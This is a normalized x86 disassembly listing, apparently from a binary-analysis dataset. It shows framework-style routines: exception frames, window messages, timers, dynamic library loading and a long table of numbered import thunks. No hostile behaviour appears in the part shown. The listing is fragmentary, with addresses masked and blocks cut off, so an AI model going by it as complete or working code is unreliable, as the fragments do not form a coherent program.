sub_453dc8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45301c
retn
mov eax edx
retn
sub_453e02
jmp sub_40360c
sub_453e07
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45416d
jmp sub_4038c0
sub_454174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
sub_45418a
jmp sub_4038c0
sub_45428b
jmp sub_4038c0
sub_454292
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4542af
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
sub_4542a8
jmp sub_4038c0
sub_4542cd
jmp sub_4038c0
sub_454357
jmp sub_4038c0
sub_45435e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454390
push ebx
mov ebx eax
mov eax ebx
call sub_418030
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41f8d8
sub_454454
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_454468
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_454470
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_454835
jmp sub_4038c0
sub_45483c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4570c8
mov eax [ rw-data ]
retn
sub_4570d0
mov [ rw-data ] eax
retn
sub_457218
jmp sub_40360c
sub_45724f
jmp sub_4038c0
sub_457256
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45755e
jmp sub_4038c0
sub_457565
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457609
jmp sub_4038c0
sub_457610
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4576a0
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_457dcc
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458478
sub_457de8
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_457dcc
sub_457f08
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458478
sub_457f20
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_458478
sub_457f38
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_458478
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_457f64
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_457f70
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_458478
retn
sub_458250
push ebx
mov ebx edx
mov edx ebx
call sub_443258
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_4582c0
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_4583e8
jmp sub_4038c0
sub_4583ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4583f8
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_457804
mov eax [ ebx + 0x20c ]
call sub_457804
sub_458458
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_458468
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_458563
jmp sub_4038c0
sub_458570
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_458588
sub_4587a4
retn
sub_458812
jmp sub_4038c0
sub_458851
jmp sub_4038c0
sub_458884
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_444750
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_457a90
retn
sub_4588a8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_444770
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_457a90
retn
sub_45899d
jmp sub_4038c0
sub_4589a4
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4576f8
mov eax [ ebp - 0x4 ]
call sub_458478
sub_458a7c
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44396c
sub_458a90
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_458bd0
jmp sub_4038c0
sub_458c08
jmp sub_4038c0
sub_458c0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458c2f
lea eax [ ebp - 0x114 ]
call sub_403f40
retn
sub_458c28
jmp sub_4038c0
sub_458c2f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_458f36
jmp sub_4038c0
sub_458f3d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034e0
sub_458f91
jmp sub_40360c
sub_45900d
jmp sub_40360c
sub_459012
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4593ca
jmp sub_4038c0
sub_4593d1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4594ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41c500
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4594c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4594fc
mov edx eax
mov eax esi
call sub_41dd88
pop esi
pop ebx
retn
sub_4594e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a8a0
mov edx eax
mov eax esi
call sub_41dd88
pop esi
pop ebx
retn
sub_4594fc
push ebx
mov ebx eax
mov eax ebx
call sub_45a540
mov edx r-xdata
call sub_422848
pop ebx
retn
sub_459600
push ebx
mov ebx eax
mov eax ebx
call sub_459610
xor al 0x1
pop ebx
retn
sub_459610
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45966c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45968c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4596ac
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4599a5
jmp sub_4038c0
sub_4599ac
pop ecx
pop ebp
retn
sub_4599b0
xor eax eax
retn
sub_459c88
jmp sub_4038c0
sub_459c8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_459ca5
jmp sub_4038c0
sub_459d8f
jmp sub_4038c0
sub_459d96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459db3
mov eax [ ebp - 0xc ]
call sub_40316c
retn
sub_459dac
jmp sub_4038c0
sub_459dd3
jmp sub_4038c0
sub_45a0be
jmp sub_4038c0
sub_45a251
jmp sub_4038c0
sub_45a540
mov eax [ eax + 0x238 ]
retn
sub_45a548
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45a554
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45a892
jmp sub_4038c0
sub_45a899
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a8a0
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45a8e8
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44396c
sub_45a904
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45a940
push ebx
mov ebx eax
mov eax ebx
call sub_445984
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4221f8
sub_45a9c4
push ebx
mov ebx eax
mov eax ebx
call sub_4459ac
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_4228ec
sub_45a9e4
push ebx
mov ebx eax
mov eax ebx
call sub_45a604
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45a6cc
pop ebx
retn
sub_45b211
lea eax [ ebp - 0xb4 ]
call sub_403f40
retn
sub_45b21d
jmp sub_4038c0
j_sub_45b211
jmp sub_45b211
sub_45b224
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b37c
jmp sub_4038c0
sub_45b383
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b668
jmp sub_4038c0
sub_45b66f
mov eax [ rw-data ]
call sub_45df20
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b686
add [ eax ] al
retn
sub_45b8e4
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45b904
mov eax [ eax + 0x240 ]
call sub_428318
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45fcc0
sub_45b9ab
jmp sub_4038c0
sub_45b9b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b9d5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4228c4
retn
sub_45b9ce
jmp sub_4038c0
sub_45b9d5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bb94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b904
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45bdfc
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_4531d0
sub_45bee7
jmp sub_4038c0
sub_45beee
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bef4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45b6dc
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45bf4c
call sub_45cc74
retn
sub_45c399
jmp sub_4038c0
sub_45c3a0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c69c
jmp sub_40360c
sub_45ca38
jmp sub_40360c
sub_45cb31
jmp sub_4038c0
sub_45cb38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb55
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_45cb4e
jmp sub_4038c0
sub_45cb55
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cb5c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_428318
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4595a4
sub_45cb7c
call sub_40316c
retn
sub_45cbd4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45cc3a
jmp sub_4038c0
sub_45cde8
jmp sub_40360c
sub_45ce14
xor edx edx
call sub_459908
retn
sub_45ce1c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_459908
mov eax ebx
call sub_43fe10
pop ebx
retn
sub_45cea2
jmp sub_4038c0
sub_45cea9
pop ebx
pop ecx
pop ebp
retn
sub_45ceb0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_446450
push eax
call PostMessageA
pop ebx
retn
sub_45d0b4
jmp sub_4038c0
sub_45d155
jmp sub_4038c0
sub_45d15f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d17e
mov eax [ rw-data ]
call sub_45f398
retn
sub_45d177
jmp sub_4038c0
sub_45d17e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d19b
lea eax [ ebp - 0x20 ]
call sub_403f40
retn
sub_45d194
jmp sub_4038c0
sub_45d19b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d27c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43efbc
retn
mov edx eax
mov eax [ rw-data ]
call sub_45e9ec
retn
sub_45d600
mov edx eax
mov eax [ rw-data ]
call sub_46040c
mov al 0x1
retn
sub_45d6e8
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45d610
sub_45d6fc
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45d610
sub_45d710
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45d610
sub_45d724
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45d610
sub_45d738
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45d8a3
jmp sub_4038c0
sub_45d8aa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d8b0
push ebx
mov ebx eax
mov eax ebx
call sub_444d68
mov eax ebx
call sub_444eec
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45ceb0
sub_45db26
jmp sub_4038c0
sub_45db2d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45db34
push ebx
mov ebx edx
mov edx ebx
call sub_4451d0
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43f0c4
pop ebx
retn
sub_45db88
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dbf0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45dba0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dbf0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45dbbc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dbf0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45dbd4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dbf0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45de70
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45de7c
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45de88
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45de94
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45dea0
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45deac
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45deb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_417e94
pop esi
pop ebx
retn
sub_45decc
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45dee8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417e94
pop esi
pop ebx
retn
sub_45defc
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45df04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417e94
pop esi
pop ebx
retn
sub_45df18
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45dff4
mov eax [ eax + 0x54 ]
call sub_417d38
retn
sub_45e000
mov eax [ eax + 0x54 ]
call sub_418030
retn
sub_45e253
jmp sub_4038c0
sub_45e297
jmp sub_4038c0
sub_45e29e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45e2ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45e0ec
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f94
pop esi
pop ebx
retn
sub_45e358
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_417e94
pop esi
pop ebx
retn
sub_45e36c
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45e571
jmp sub_4038c0
sub_45e578
pop ebx
mov esp ebp
pop ebp
retn
sub_45e580
inc [ eax + 0x8c ]
retn
sub_45e588
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45e5a8
sub_45e5a8
xor edx edx
call sub_45e9ec
retn
sub_45e9de
jmp sub_4038c0
sub_45ea65
jmp sub_4038c0
sub_45ea74
add eax 0x30
call sub_40d3ac
retn
sub_45eab8
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_40360c#9
jmp sub_40360c
sub_45eb0e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45f1dd
jmp sub_4038c0
sub_45f1e4
pop ebx
mov esp ebp
pop ebp
retn
sub_45f36c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45f398
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45f3c4
xor edx edx
call sub_45f2bc
retn
sub_45f3cc
mov dl 0x1
call sub_45f2bc
retn
sub_45f440
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45f458
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45f525
jmp sub_4038c0
sub_45f52c
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40360c#8
jmp sub_40360c
sub_460274
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4602ca
jmp sub_40360c
j_sub_40360c#7
jmp sub_40360c
sub_4603ea
jmp sub_4038c0
sub_4603f1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4603f8
call sub_40cefc
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_4605f1
jmp sub_4038c0
sub_4605f8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4606bf
jmp sub_4038c0
sub_4606c6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46089c
jmp sub_4038c0
sub_4608a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460904
jmp sub_4038c0
sub_46090b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460914
call sub_4606dc
retn
j_sub_40360c#6
jmp sub_40360c
sub_460b58
jmp sub_4038c0
sub_460b5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460c8d
jmp sub_4038c0
sub_460dec
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4610eb
jmp sub_4038c0
sub_46111a
jmp sub_4038c0
sub_461226
jmp sub_4038c0
sub_46122d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4615be
jmp sub_4038c0
sub_4615c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4616e8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_461733
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_461744
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_461754
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4617c7
jmp sub_4038c0
sub_4617ce
pop ebp
retn
sub_4617d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_461764
call sub_403c90
call sub_4616e8
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_4573a4
call sub_417988
sub_4623dd
jmp sub_4038c0
sub_4623e4
pop ebp
retn
sub_4623e8
sub [ rw-data ] 0x1
retn
sub_4626c5
jmp sub_4038c0
sub_4626cc
pop ebp
retn
sub_4626d0
sub [ rw-data ] 0x1
retn
sub_4627f0
jmp sub_4038c0
sub_462828
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_463688
sub_462844
mov eax 0x0
call sub_4635d4
jmp eax
sub_462850
retn
sub_462854
mov eax 0x1
call sub_4635d4
jmp eax
sub_462860
retn
sub_462864
mov eax 0x2
call sub_4635d4
jmp eax
sub_462870
retn
sub_462874
mov eax 0x3
call sub_4635d4
jmp eax
sub_462880
retn
sub_462884
mov eax 0x4
call sub_4635d4
jmp eax
sub_462890
retn
sub_462894
mov eax 0x5
call sub_4635d4
jmp eax
sub_4628a0
retn
sub_4628a4
mov eax 0x6
call sub_4635d4
jmp eax
sub_4628b0
retn
sub_4628b4
mov eax 0x7
call sub_4635d4
jmp eax
sub_4628c0
retn
sub_4628c4
mov eax 0x8
call sub_4635d4
jmp eax
sub_4628d0
retn
sub_4628d4
mov eax 0x9
call sub_4635d4
jmp eax
sub_4628e0
retn
sub_4628e4
mov eax 0xa
call sub_4635d4
jmp eax
sub_4628f0
retn
sub_4628f4
mov eax 0xb
call sub_4635d4
jmp eax
sub_462900
retn
sub_462904
mov eax 0xc
call sub_4635d4
jmp eax
sub_462910
retn
sub_462914
mov eax 0xd
call sub_4635d4
jmp eax
sub_462920
retn
sub_462924
mov eax 0xe
call sub_4635d4
jmp eax
sub_462930
retn
sub_462934
mov eax 0xf
call sub_4635d4
jmp eax
sub_462940
retn
sub_462944
mov eax 0x10
call sub_4635d4
jmp eax
sub_462950
retn
sub_462954
mov eax 0x11
call sub_4635d4
jmp eax
sub_462960
retn
sub_462964
mov eax 0x12
call sub_4635d4
jmp eax
sub_462970
retn
sub_462974
mov eax 0x13
call sub_4635d4
jmp eax
sub_462980
retn
sub_462984
mov eax 0x14
call sub_4635d4
jmp eax
sub_462990
retn
sub_462994
mov eax 0x15
call sub_4635d4
jmp eax
sub_4629a0
retn
sub_4629a4
mov eax 0x16
call sub_4635d4
jmp eax
sub_4629b0
retn
sub_4629b4
mov eax 0x17
call sub_4635d4
jmp eax
sub_4629c0
retn
sub_4629c4
mov eax 0x18
call sub_4635d4
jmp eax
sub_4629d0
retn
sub_4629d4
mov eax 0x19
call sub_4635d4
jmp eax
sub_4629e0
retn
sub_4629e4
mov eax 0x1a
call sub_4635d4
jmp eax
sub_4629f0
retn
sub_4629f4
mov eax 0x1b
call sub_4635d4
jmp eax
sub_462a00
retn
sub_462a04
mov eax 0x1c
call sub_4635d4
jmp eax
sub_462a10
retn
sub_462a14
mov eax 0x1d
call sub_4635d4
jmp eax
sub_462a20
retn
sub_462a24
mov eax 0x1e
call sub_4635d4
jmp eax
sub_462a30
retn
sub_462a34
mov eax 0x1f
call sub_4635d4
jmp eax
sub_462a40
retn
sub_462a44
mov eax 0x20
call sub_4635d4
jmp eax
sub_462a50
retn
sub_462a54
mov eax 0x21
call sub_4635d4
jmp eax
sub_462a60
retn
sub_462a64
mov eax 0x22
call sub_4635d4
jmp eax
sub_462a70
retn
sub_462a74
mov eax 0x23
call sub_4635d4
jmp eax
sub_462a80
retn
sub_462a84
mov eax 0x24
call sub_4635d4
jmp eax
sub_462a90
retn
sub_462a94
mov eax 0x25
call sub_4635d4
jmp eax
sub_462aa0
retn
sub_462aa4
mov eax 0x26
call sub_4635d4
jmp eax
sub_462ab0
retn
sub_462ab4
mov eax 0x27
call sub_4635d4
jmp eax
sub_462ac0
retn
sub_462ac4
mov eax 0x28
call sub_4635d4
jmp eax
sub_462ad0
retn
sub_462ad4
mov eax 0x29
call sub_4635d4
jmp eax
sub_462ae0
retn
sub_462ae4
mov eax 0x2a
call sub_4635d4
jmp eax
sub_462af0
retn
sub_462af4
mov eax 0x2b
call sub_4635d4
jmp eax
sub_462b00
retn
sub_462b04
mov eax 0x2c
call sub_4635d4
jmp eax
sub_462b10
retn
sub_462b14
mov eax 0x2d
call sub_4635d4
jmp eax
sub_462b20
retn
sub_462b24
mov eax 0x2e
call sub_4635d4
jmp eax
sub_462b30
retn
sub_462b34
mov eax 0x2f
call sub_4635d4
jmp eax
sub_462b40
retn
sub_462b44
mov eax 0x30
call sub_4635d4
jmp eax
sub_462b50
retn
sub_462b54
mov eax 0x31
call sub_4635d4
jmp eax
sub_462b60
retn
sub_462b64
mov eax 0x32
call sub_4635d4
jmp eax
sub_462b70
retn
sub_462b74
mov eax 0x33
call sub_4635d4
jmp eax
sub_462b80
retn
sub_462b84
mov eax 0x34
call sub_4635d4
jmp eax
sub_462b90
retn
sub_462b94
mov eax 0x35
call sub_4635d4
jmp eax
sub_462ba0
retn
sub_462ba4
mov eax 0x36
call sub_4635d4
jmp eax
sub_462bb0
retn
sub_462bb4
mov eax 0x37
call sub_4635d4
jmp eax
sub_462bc0
retn
sub_462bc4
mov eax 0x38
call sub_4635d4
jmp eax
sub_462bd0
retn
sub_462bd4
mov eax 0x39
call sub_4635d4
jmp eax
sub_462be0
retn
sub_462be4
mov eax 0x3a
call sub_4635d4
jmp eax
sub_462bf0
retn
sub_462bf4
mov eax 0x3b
call sub_4635d4
jmp eax
sub_462c00
retn
sub_462c04
mov eax 0x3c
call sub_4635d4
jmp eax
sub_462c10
retn
sub_462c14
mov eax 0x3d
call sub_4635d4
jmp eax
sub_462c20
retn
sub_462c24
mov eax 0x3e
call sub_4635d4
jmp eax
sub_462c30
retn
sub_462c34
mov eax 0x3f
call sub_4635d4
jmp eax
sub_462c40
retn
sub_462c44
mov eax 0x40
call sub_4635d4
jmp eax
sub_462c50
retn
sub_462c54
mov eax 0x41
call sub_4635d4
jmp eax
sub_462c60
retn
sub_462c64
mov eax 0x42
call sub_4635d4
jmp eax
sub_462c70
retn
sub_462c74
mov eax 0x43
call sub_4635d4
jmp eax
sub_462c80
retn
sub_462c84
mov eax 0x44
call sub_4635d4
jmp eax
sub_462c90
retn
sub_462c94
mov eax 0x45
call sub_4635d4
jmp eax
sub_462ca0
retn
sub_462ca4
mov eax 0x46
call sub_4635d4
jmp eax
sub_462cb0
retn
